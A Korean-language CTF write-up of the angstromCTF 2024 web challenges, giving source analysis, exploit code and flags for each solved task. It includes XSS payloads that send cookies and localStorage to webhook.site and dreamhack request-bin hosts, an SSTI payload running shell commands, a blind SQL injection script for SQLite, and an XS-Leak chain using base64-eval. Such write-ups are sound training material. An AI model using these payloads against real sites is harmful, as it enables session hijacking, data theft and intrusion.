---
layout: post
title: angstromCTF 2024
description: CTF Write-up
tags: angstromCTF 
category: ctf
---   
     
# angstromCTF

## 대회 일정
**2024-05-25 09:00 ~ 2024-05-28 09:00**

## 대회 결과                
<img src="/assets/images/ctf/2024/angstrom/web.jpg" width="700px">                 
         
웹은 총 8문제가 나왔고, 그 중 5문제를 풀었다. `pastebin` 문제는 접근 방법은 맞았는데 브포하다가 너무 오래걸려 대회 중에는 풀지 못했다. `wwwwwwwwas` 문제는 `XS-Leak` 문제였는데 대회 당시엔 접근 방법이 떠오르지 않아 해결하지 못했다.    
          
<img src="/assets/images/ctf/2024/angstrom/dashboard.jpg" width="700px">        
             
최종 등수는 191등으로 마무리하였고, 재밌게 풀었던 것 같다.                
             
<img src="/assets/images/ctf/2024/angstrom/score.jpg" width="700px">       
        
크루 근무를 돌며 ... CTF 하기란 시간 내기가 참 쉽지가 않은 듯 하다...        
          
## Writeup   
        
- <a href="#spinner">spinner</a>     
- <a href="#markdown">markdown</a>   
- <a href="#winds">winds</a>   
- <a href="#store">store</a>     
- <a href="#pastebin">pastebin</a>     
- <a href="#tickler">tickler</a>     
- <a href="#wwwwwwwwas">wwwwwwwwas</a>     

<a id="spinner"></a>      
       
# spinner     
           
613 solved / 50 pts                   

```javascript
if (state.total >= 10_000 * 360) {
    state.flagged = true
    const response = await fetch('/falg', { method: 'POST' })
    element.textContent = await response.text()
}
```     
        
회전 횟수가 `10,000` 이상인 경우, 플래그를 반환한다.    
      
`fetch()` 함수를 사용하여 요청을 보내 플래그를 읽어오면 된다.    
                       
### Exploit Code      
                        
<img src="/assets/images/ctf/2024/angstrom/spinner/flag.jpg" width="700px">                
        
### Flag       
actf{b152d497db04fcb1fdf6f3bb64522d5e}           
                                 

<a id="markdown"></a>      
      
# markdown     

282 solved / 80 pts             
      
```javascript
app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
            ? process.env.FLAG
            : 'no flag for you'
    )
})
```
            
플래그를 획득하기 위해 봇으로부터 TOKEN 값을 탈취해야한다.   
       
이를 통해, XSS 취약점을 활용해야함을 어느 정도 알 수 있다.      
       
```javascript    
app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
}) 
```   
마크다운 형식의 입력 값을 받아 결과를 보여주는 코드이다.     
      
`content.innerHTML = marked.parse(text)` 코드로 인해 XSS가 발생하게 된다.      
      
`<img>` 태그를 사용하여 XSS를 발생시키고 봇에게 해당 URL을 넘겨주면 된다.    
       
### Exploit Code     
```javascript
<img src="x" onerror="location.href=`https://webhook.site/ddaad04c-461c-48d4-9321-4204304c1e0e/?c=`+document.cookie">
```    
      
<img src="/assets/images/ctf/2024/angstrom/markdown/token.jpg" width="700px">     
         
<img src="/assets/images/ctf/2024/angstrom/markdown/flag.jpg" width="700px">        
      
### Flag       
actf{b534186fa8b28780b1fcd1e95e2a2e2c}
              

<a id="winds"></a>      
       
# winds     
                         
259 solved / 100 pts             
           
```python
@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{% raw %}{{ error }}{% endraw %}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))
```              
      
`render_template_string()` 함수를 사용하고 있어 SSTI 취약점이 발생한다.     

하지만, 유저가 입력한 값에 대해 `random.shuffle()`을 수행한 결과 값을 반영한다.           
           
`random.seed(0)`으로 시드 값이 고정되어있어 랜덤 값에 대해 유추가 가능하다.     
                        
### Exploit Code     
```python
import random
import requests

payload = {% raw %}"{{ ''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate() }}"{% endraw %}
chars = [chr(x) for x in range(25,128)] # string.ascii_letters + string.digits
chars = chars[:len(payload)]
print(payload, len(payload), len(chars))

arr = {}
for idx, c in enumerate(chars):
    arr[c] = idx

text = ''.join(chars)
jumbled = list(text)

random.seed(0)
random.shuffle(jumbled)

jumbled = ''.join(jumbled)
print(jumbled)

s = [0 for _ in range(len(chars))]
i = 0 
for c in jumbled:
    s[arr[c]] = payload[i]
    i = i + 1

payload = ''.join(s)
print("exploit_code:", payload)

url = "https://winds.web.actf.co/shout"
r = requests.post(url, data={"text": payload})
print(r.text)
```
     
<img src="/assets/images/ctf/2024/angstrom/winds/flag.jpg" width="700px">      
                  
### Flag    
actf{2cb542c944f737b85c6bb9183b7f2ea8}
        
<a id="store"></a>      
      
# store         

214 solved / 100 pts                 
            
<img src="/assets/images/ctf/2024/angstrom/store/try.jpg" width="700px">       
                        
`Otamatone` 문자를 입력하니 추가 정보가 나오는 것을 확인했다.    
                                                        
```javascript
<script>
    const form = document.querySelector('form')
    form.addEventListener('submit', (event) => {
    const item = form.querySelector('input[name="item"]').value
    const allowed = new Set(
                    'abcdefghijklmnop' +
                    'qrstuvwxyzABCDEF' +
                    'GHIJKLMNOPQRSTUV' +
                    'WXYZ0123456789, '
                )
    if (item.split('').some((char) => !allowed.has(char))) {
        alert('Invalid characters in search query.')
        event.preventDefault()
        }
    })
</script>            
```              

index.html 페이지에 유저 입력에 대해 문자 필터링을 걸어놓았기에 직접 `requests` 요청을 보내 결과를 확인했다.     
SQL Injection 취약점인 것 같아 `' or 1=1--` 입력을 시도해보니 다른 계정 정보들도 나오는 것을 확인할 수 있었다.     

플래그 테이블은 따로 있을 것 같아 `information_schema`를 사용해 `Blind SQL Injection`을 시도했지만 오류가 떴다.    
그래서, `MySQL`이 아닌 다른 데이터베이스를 사용하는 것 같아 시도해보던 중 `SQLite` 버전 확인하는 쿼리가 먹히는 것을 확인했다.       

이후, `Blind SQL Injection` 쿼리를 작성하여 플래그를 획득했다.                              
       
### Exploit Code  
```python
import requests

url = "https://store.web.actf.co"

result = ""
length_of_table = 43
for i in range(1,60):
    print(i)

    sql = f"' or length((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))={i}--"
    print(sql)

    r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
    )
    assert r.status_code == 200

    if "<td>Otamatone</td>" in r.text:
        length_of_table = i 
        print(r.text)
        break
       
print("Length of table: ", length_of_table)

table_name = "items,flagsd69197c9018f1d6e853981d5a805846f"
table_name = "flagsd69197c9018f1d6e853981d5a805846f"  
# table_name = "items,"

for i in range(len(table_name) + 1, length_of_table + 1): 
    print(i)
    check = False
    for j in range(48, 58): 
        sql = f"' or substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{i},1)=char({j})--"
        # sql = f"' or (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like 'items') --"
        print(sql)
        r = requests.post(
                f"{url}/search", 
                data={
                    "item": f"{sql}"
                }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            table_name += chr(j)
            print(table_name) 
            check = True
            break
    
    if check : continue 

    for j in range(97, 128): 
        sql = f"' or substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{i},1)=char({j})--"
        # sql = f"' or (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like 'items') --"
        print(sql)
        r = requests.post(
                f"{url}/search", 
                data={
                    "item": f"{sql}"
                }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            table_name += chr(j)
            print(table_name) 
            break

print("Table name: ", table_name)
column_name = "flag" #"id,name,detail" # items
for i in range(len(column_name) + 1, 50): 
    print(i)
    check = False
    for j in range(32, 128): 
        sql = f"' or substr((SELECT group_concat(name) AS column_names FROM pragma_table_info('{table_name}')),{i},1)=char({j})--"
        print(sql)
        r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            check = True 
            column_name += chr(j)
            print(column_name) 
            break

    if check == False:
        break 

flag = "actf{"
for i in range(len(flag) + 1, 50): 
    print(i)
    check = False
    for j in "{}0123456789abcdefghijklmnopqrstuvwxyz": 
        sql = f"' or substr((SELECT {column_name} FROM {table_name}),{i},1)='{j}'--"
        print(sql)
        r = requests.post(
            f"{url}/search", 
            data={
                "item": f"{sql}"
            }
        )
        assert r.status_code == 200

        if "<td>Otamatone</td>" in r.text:
            check = True 
            flag += (j)
            print(flag) 
            break

    if check == False: 
        break 

print(flag)
```                                            

대회 도중에 flag 테이블 명이 바뀌는 걸 확인하고, 특정 시간마다 바뀌는구나 싶어서 급하게 짠 지저분한 코드 ...
           
<img src="/assets/images/ctf/2024/angstrom/store/flag.jpg" width="700px">     
                   
### Flag       
actf{37619bbd0b81c257b70013fa1572f4ed}          
            
<a id="pastebin"></a> 
              
# pastebin        
            
121 solved / 120 pts                      
                    
```python
import hashlib
import html
import os
import secrets

from server import Server

ADMIN_PASSWORD = hashlib.md5(
    f'password-{secrets.token_hex}'.encode()
).hexdigest()

pastes = {}

def add_paste(paste_id, content, admin_only=False):
    pastes[paste_id] = {
        'content': content,
        'admin_only': admin_only,
    }

server = Server()

@server.get('/')
async def root(request):
    del request
    return (200, '''
        <link rel="stylesheet" href="/style.css">
        <div class="container">
            <h1>Pastebin</h1>
            <form action="/paste" method="post">
                <textarea
                    name="content"
                    rows="10"
                    placeholder="Content..."
                ></textarea>
                <input type="submit" value="Create Paste">
            </form>
        </div>
    ''')

@server.post('/paste')
async def paste(request):
    data = await request.post()
    content = data.get('content', '')
    paste_id = id(content)

    add_paste(paste_id, content)

    return (200, f'''
        <link rel="stylesheet" href="/style.css">
        <div class="container">
            <h1>Paste Created</h1>
            <p><a href="/view?id={paste_id}">View Paste</a></p>
        </div>
    ''')

@server.get('/view')
async def view_paste(request):
    id = request.query.get('id')
    paste = pastes.get(int(id))

    if paste is None:
        return (404, 'Paste not found')

    if paste['admin_only']:
        password = request.query.get('password', '')
        if password != ADMIN_PASSWORD:
            return (
                403,
                f'Incorrect parameter &password={ADMIN_PASSWORD[:6]}...',
            )

    return (200, f'''
        <link rel="stylesheet" href="/style.css">
        <div class="container">
            <h1>Paste</h1>
            <pre>{html.escape(paste['content'])}</pre>
        </div>
    ''')

add_paste(0, os.getenv('FLAG', 'missing flag'), admin_only=True)
server.run('0.0.0.0', 3000)
```      
            
`hashlib.md5(f'password-{secrets.token_hex}'.encode()).hexdigest()`로 `ADMIN_PASSWORD`를 생성하는데 이 값을 알아내면 플래그를 획득할 수 있다.    
       
```python
>>> import secrets
>>> secrets.token_hex
<function token_hex at 0x7f02814116c0>
```             
           
로컬에서 `secrets.token_hex` 값을 출력해보면, 주소 값이 나오는 것을 확인할 수 있다.          
하지만, 실제 서버에서 생성한 `secrets.token_hex` 값은 알 수 없기에 이를 찾아야한다.                         
                
글을 작성하면, `/paste` 엔드포인트에서 `paste_id = id(content)` 코드를 실행시켜 `id` 값을 지정한다.                      
        
> Return the "identity'' of an object. This is an integer (or long integer) which is guaranteed to be unique and constant for this object during its lifetime. Two objects with non-overlapping lifetimes may have the same id() value. (CPython implementation detail: This is the address of the object in memory.)       
                        
`id()` 함수에 대해 공식 문서를 찾아보면, 객체의 주소 값을 반환한다는 것을 알 수 있다.                        
`/view` 엔드포인트에서 `id` 값으로 `0`을 넘겨주면 `paste['admin_only']`를 만족하여 패스워드 6자리를 알아낼 수 있다.        

즉, 글을 작성하여 얻은 `paste_id` 값을 빼가며 `ADMIN_PASSWORD` 패스워드 앞 6자리와 비교하며 매칭되는 `ADMIN_PASSWORD`를 찾아낼 수 있다.                   
    
```python
password-<function token_hex at 0x7b53722bd436> 1797c2a5536b66caeb1e43b67caa84b6
password-<function token_hex at 0x7b5375bcc449> 1797c23c64743f92b60006b65ac76041
password-<function token_hex at 0x7b53781e8d22> 1797c26ee6c3786188292cc0b096a893
password-<function token_hex at 0x7b53789a9714> 1797c28c6de75aa270ebeca5d23c13ba
password-<function token_hex at 0x7b536f0a7e41> 1797c20bafbf9ef804afa75696d21b81
```
위 방법대로 시도했는데 위와 같이 여러 해시 값이 나왔지만, `ADMIN_PASSWORD`에 맞지 않은 값들만 나오고 돌리던 코드가 종료되는 억까를 당해 대회 당시에는 풀지 못했다....     

대회가 끝나고 조금 지나고나서야 풀렸다... :(            
               
### Exploit Code      
```python
import hashlib
import requests 

url = "https://pastebin.web.actf.co"

for x in range(135598340834432, 0, -1):
    s = 'password-<function token_hex at 0x{:x}>'.format(x)
    hash = hashlib.md5(s.encode()).hexdigest()
    print(s, hash)

    if hash[:6] == '1797c2':
        print(s, hash)
        r = requests.get(
            f"{url}/view?id=0&password={hash}"
        )
        if not "Incorrect" in r.text:
            print(r.text)
            exit(0)
```
           
### Flag     
         
                    
<a id="tickler"></a>             
                      
# tickler              

51 solved / 180 pts              
              
```typescript
const router = trpc.router({
    ...
    doTickle: authedProcedure
        .input(z.object({ username: z.string() }))
        .mutation(({ input: { username }, ctx }) => {
            if (!users.has(username)) {
                return {
                    success: false as const,
                    message: 'User does not exist.',
                }
            }

            if (username === ctx.user) {
                return {
                    success: false as const,
                    message: 'Nice try.',
                }
            }

            const count = tickles.get(username) ?? 0
            tickles.set(username, count + 1)

            return { success: true as const }
        }),

    getTickles: publicProcedure
        .input(z.object({ username: z.string() }))
        .query(({ input: { username } }) => {
            if (!users.has(username)) {
                return {
                    success: false as const,
                    message: 'User does not exist.',
                }
            }
            return {
                success: true as const,
                count: tickles.get(username) ?? 0,
            }
        }),

    getFlag: authedProcedure.query(({ ctx }) => {
        if (tickles.get(ctx.user) !== Infinity) {
            return { success: false as const, message: 'Not enough tickles.' }
        }
        return { success: true as const, flag: process.env.FLAG }
    }),
    ...
})
```
             
`tickles.get(ctx.user)` 값이 `Infinity`인 계정으로 접속하면 플래그를 획득할 수 있다.    
`/api/doTickle` 엔드포인트에 접근하면 값을 1씩 증가시킬 수 있긴한데 `Infinity` 값을 만들기엔 불가능하다.    
      
```typescript
const server = http.createServer(async (req, res) => {
    ...
    if (route === '/admin') {
        if (process.env.ADMIN === undefined) return end()

        const body: Buffer[] = []
        req.on('data', (chunk) => body.push(chunk))
        await new Promise((resolve) => req.on('end', resolve))

        const data = Buffer.concat(body).toString()
        if (data !== process.env.ADMIN) return end()

        const username = crypto.randomBytes(16).toString('hex')
        const password = crypto.randomBytes(16).toString('hex')

        users.set(username, password)
        tickles.set(username, Infinity)

        res.setHeader('content-type', 'application/json')
        return res.end(JSON.stringify({ username, password }))
    } 
    ...
})           
```             
               
그래서, `/admin` 엔드포인트를 보면 무한대 값이 설정된 계정을 생성하는 것을 볼 수 있다.   
즉, 랜덤으로 생성된 `username`의 계정의 정보를 알아내서 플래그를 획득하면 된다.    
                   
```javascript
"/login": async () => {
      const form = document.querySelector("form");
      const error = document.querySelector("p");
      const query = new URLSearchParams(window.location.search);
      if (query.has("error")) {
        error.innerHTML = query.get("error") ?? "";
      }
      form.addEventListener("submit", async (event) => {
        event.preventDefault();
        const username = form.elements.namedItem("n");
        const password = form.elements.namedItem("p");
        const result = await client.doLogin.mutate({
          username: username.value,
          password: password.value
        });
        if (!result.success) {
          error.textContent = `Login failed. ${result.message}`;
        } else {
          localStorage.setItem("username", username.value);
          localStorage.setItem("password", password.value);
          window.location.href = "/";
        }
    });
}
```
`/build/client.js`의 `/login` 부분을 보면, 파라미터에 `error`가 포함된지 확인하는 조건문이 있다.     
`?error=`가 존재할 경우, `error.innerHTML`에 파라미터 값이 들어가게 되어 스크립트 삽입이 가능해진다.        
         
```typescript         
const router = trpc.router({
    ...
    setPicture: authedProcedure
        .input(z.object({ url: z.string() }))
        .mutation(async ({ input: { url }, ctx }) => {
            let response
            try {
                response = await fetch(url)
            } catch {
                return {
                    success: false as const,
                    message: 'Failed to fetch image.',
                }
            }

            if (!response.ok) {
                return {
                    success: false as const,
                    message: 'Failed to fetch image.',
                }
            }

            const reader = response.body?.getReader()
            if (reader === undefined) {
                return {
                    success: false as const,
                    message: 'No image data.',
                }
            }

            let size = 0
            const data = []
            while (true) {
                const { done, value } = await reader.read()
                if (done) break
                size += value.byteLength
                if (size > 1e6) {
                    return {
                        success: false as const,
                        message: 'Image too large.',
                    }
                }
                data.push(value)
            }

            const buffer = new Blob(data)
            const array = await buffer.arrayBuffer()
            const base64 = Buffer.from(array).toString('base64')
            pictures.set(ctx.user, {
                data: base64,
                type: response.headers.get('content-type') ?? 'image/png',
            })

            return { success: true as const }
        }),
    ...
})
```
      
각 유저마다 프로필을 업데이트 할 수 있는 기능이 존재했다. `await fetch(url)`를 통해 `Response`의 `content-type`는 `pictures`의 `type`으로 들어가고, 데이터 값은 `base64` 형태로 저장한다.      

```typescript
const server = http.createServer(async (req, res) => {
    res.setHeader('content-security-policy', 'script-src \'self\'')

    const url = req.url ?? ''
    let route = url
    if (route.includes('?')) {
        route = route.slice(0, route.indexOf('?'))
    }
    route = path.normalize(`/${route ?? ''}`)

    const end = () => {
        res.writeHead(404)
        res.end()
    }

    if (route === '/admin') {
        ...
    } else if (route === '/picture') {
        if (!url.includes('?')) return end()

        const query = new URLSearchParams(url.slice(url.indexOf('?')))
        const username = query.get('username')

        if (username === null) return end()

        const picture = pictures.get(username)
        if (picture === undefined) return end()

        const { data, type } = picture
        res.end(`data:${type};base64,${data}`)
    } else if (route.startsWith('/api/')) {
        await nodeHTTPRequestHandler({
            router,
            req,
            res,
            path: route.slice('/api/'.length),
            createContext: ({ req }) => {
                const header = req.headers.login
                const clean = Array.isArray(header) ? header[0] : header ?? ''
                const [user, password] = clean.split(':') ?? []
                return { user, password }
            },
        })
    } else {
        if (route === '/') route = '/index.html'
        else if (!route.includes('.')) route += '.html'
        send(res, path.join(import.meta.dirname, 'public', route))
    }
})

server.listen(3000, () => {
    console.log('running on :3000')
})

export type Router = typeof router
```       

`/picture` 엔드포인트에서는 계정에 따라 프로필을 `data:${type};base64,${data}"` 형태로 보여준다.     

`MIME TYPE`이 위치해야할 자리에 JS 코드를 넣고, 이전에 언급한 `error.innerHTML`에 `<iframe srcdoc="<script src='profile path'></script>"></iframe>` 스크립트를 삽입하면 XSS를 트리거 할 수 있게 된다. 
               
그 이유는 CSP 정책이 `Content-Security-Policy: script-src 'self'`로 설정되어있어 JSONP, 유저가 업로드한 파일 등을 활용하면 스크립트를 실행시킬 수 있기 떄문이다.       
      
### Exploit Code     

```php
<?php
    header('content-type: window.location="https://tjchkab.request.dreamhack.games/?d="+btoa(JSON.stringify(window.localStorage))//');
    echo "test";
?>
```     
      
<img src="/assets/images/ctf/2024/angstrom/tickler/profile.jpg" width="700px">      
               
프로필을 업데이트할 때, 위 코드가 실행되고 있는 서버로 `fetch()`하여 이미지를 업데이트 해준다.       
        
<img src="/assets/images/ctf/2024/angstrom/tickler/profile.jpg" width="700px">                        
                  
프로필 업데이트를 누르면, 이미지가 바뀐 것을 확인할 수 있다.           
            
`data:window.location="https://tjchkab.request.dreamhack.games/?d="+btoa(JSON.stringify(window.localStorage))//;base64,dGVzdA==`              

`https://tickler.web.actf.co/picture?username=guest12345` 페이지에 방문하면, 위 내용이 존재하고, `<script>`의 `src`에서 해당 링크를 불러오면 스크립트가 실행된다.      
                                     
`https://tickler.web.actf.co/login?error=<iframe srcdoc="<script src='https://tickler.web.actf.co/picture?username=guest12345'></script>"</iframe>`             
                
최종적으로, 위 스크립트를 봇에게 전달하면, `webhook`을 통해 `username`과 `password` 값을 받을 수 있다.     

<img src="/assets/images/ctf/2024/angstrom/tickler/request.jpg" width="700px">               

<img src="/assets/images/ctf/2024/angstrom/tickler/admin.jpg" width="700px">                                 

```python
import requests

url = "https://tickler.web.actf.co"

s = requests.session()

r = s.get(
    f"{url}/api/getFlag",
    headers={"Login": "95d8f04e645b6e949cae2447fb9d49e6:004261d7a4025246b994fb909fc2efdc"}
)
print(r.text)
```       
  
<img src="/assets/images/ctf/2024/angstrom/tickler/flag.jpg" width="700px">                   

### Flag                      
actf{c4d8f38d1195fda4b7e025f40e16942e}    
                
<a id="wwwwwwwwas"></a>            
                          
# wwwwwwwwas             
      
19 solved / 250 pts          
       
```javascript 
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');

let flags = ["flag{example_flag}", "aplet123ctf{the_hallmark_of_a_great_misc_challenge}"];
fs.readFile('flag.txt', 'utf8', function(err, data) {  
	if (err) throw err;
	flags.push(data);
});

const secretvalue = process.env.SECRET_KEY || crypto.randomBytes(32).toString('hex')

const app = express();

app.use(express.static('static'));
app.use(cookieParser());
app.use(bodyParser.urlencoded({extended:false}));

app.use((req, res, next) => {
	res.set('X-Frame-Options', 'deny');
	res.set('X-Content-Type-Options', 'nosniff');
	res.set('Cache-Control', 'no-store');
	next()
})

app.get('/', (req, res) => {
	res.sendFile('static/index.html',{root:__dirname});
})

app.get('/search', (req, res) => {
	if (req.cookies['admin_cookie'] !== secretvalue) {
		res.status(403).send("Unauthorized");
		return;
	}
	try {
		let query = req.query.q;
		for (let flag of flags) {
			if (flag.indexOf(query) !== -1) {
				res.status(200).send("Found");
				return;
			}
		}
		res.status(404).send("Not Found");
	} catch (e) {
		console.log(e);
		res.sendStatus(500);
	}
})

app.listen(21111,()=>console.log('running'));
```     

`admin_cookie` 쿠키 값을 가지고 있으면, `indexOf()` 함수를 통해 플래그를 알아낼 수 있다.    
       
```javascript
const puppeteer = require("puppeteer");

const sleep = s => new Promise(res => setTimeout(res, s * 1000));

module.exports = {
    name: 'wwwwwwwwaas',
    timeout: 45000,
    noContext: true,
    async execute(_, url) {
        const key = process.env.CHALL_WWWWWWWWAAS_KEY || "placeholder";
        const domain = process.env.CHALL_WWWWWWWWAAS_DOMAIN || "http://localhost:3000";
        const browser = await puppeteer.launch({ pipe: true });
        try {
            let page = await browser.newPage();
            const cookie = {
                domain: domain,
                name: "admin_cookie",
                value: key,
                httpOnly: true,
                secure: true,
                sameSite: 'Lax'
            };
            await page.setCookie(cookie);
            await page.goto(url);
            await sleep(30);
        } finally {
            await browser.close();
        }
    },
};
```       

XSS로 `admin_cookie` 쿠키 값을 얻어야하나 싶었지만, `httpOnly`, `secure`, `sameSite`가 모두 걸려있었다.   
즉, 쿠키를 탈취하지 않고 봇이 플래그를 찾도록 만들어줘야한다.   

쿠키에 설정된 `sameSite: 'Lax'`는 동일한 사이트에 한에 쿠키를 공유한다.       
XSS 취약점이 발생하는 동일한 사이트를 이용해 스크립트를 실행시켜주면 된다.                 
           
Markdown: `https://markdown.web.actf.co/`                
wwwwwwwwaas: `https://wwwwwwwwaas.web.actf.co/`                       
      
두 개의 URL은 Origin이 다르지만, Site는 `https://web.actf.co`로 동일하다.      
      
Markdown 문제에서 XSS 취약점이 발생하는 것을 활용해 XS-Leak을 수행할 수 있다.            
      
### Exploit Code     
    
```python
import requests
import base64

payload = """
const url = "https://wwwwwwwwaas.web.actf.co"; 
const webhook = "https://webhook.site/8cda91cf-9e4b-4ed8-8655-11770f30a4ec"; 

function log(query) { 
    navigator.sendBeacon(webhook + '/log?flag=' + query);
}

function search(query) {
    let script = document.createElement("script"); 
    script.src = url + '/search?q=' + encodeURIComponent(query); 
    script.onload = () => { 
        log(query); 
        check(query); 
    }; 
    document.head.appendChild(script);
}

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
function check(flag) { 
    for(let i = 0 ; i < chars.length ; i++) { 
        let c = chars[i]; 
        search(flag + c); 
    }
}
check("actf{");
"""

payload = base64.b64encode(payload.encode()).decode() 

r = requests.post(
    "https://markdown.web.actf.co/create", 
    data={"content": f'<img src="x" onerror="eval(atob(`{payload}`))">'},
    allow_redirects=True
)

print(r.url)
```    
      
출력된 URL을 봇이 방문하게 하면, 플래그를 획득할 수 있다.       
            
<img src="/assets/images/ctf/2024/angstrom/wwwwwwwwas/flag.jpg" width="700px">
       
### Flag      
actf{the_w_watermarks_the_whereabouts}

